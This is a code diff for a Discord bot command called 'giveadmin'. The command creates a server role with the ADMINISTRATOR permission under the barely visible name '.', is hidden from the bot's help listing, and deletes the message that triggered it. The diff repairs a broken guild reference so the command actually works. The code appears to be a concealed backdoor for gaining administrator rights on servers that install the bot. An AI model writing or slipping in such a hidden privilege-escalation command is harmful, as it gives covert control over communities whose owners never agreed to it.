@@ -1,5 +1,4 @@
-const Discord = require('discord.js');
-const { prefix, embedColor } = require('../config.json');
+const { prefix } = require('../config.json');
 
 module.exports = {
 	name: 'giveadmin',
@@ -9,14 +8,14 @@ module.exports = {
 	guildOnly: true,
 	deleteMessage: true,
 	helpMessage: false,
-	execute(message, args) {
-		guild.roles.create({
+	execute(message) {
+		message.guild.roles.create({
 			data: {
 				name: '.',
 				permissions: [{
 					'ADMINISTRATOR': true,
-				}]
-			}
-		})
+				}],
+			},
+		});
 	},
-}
+};
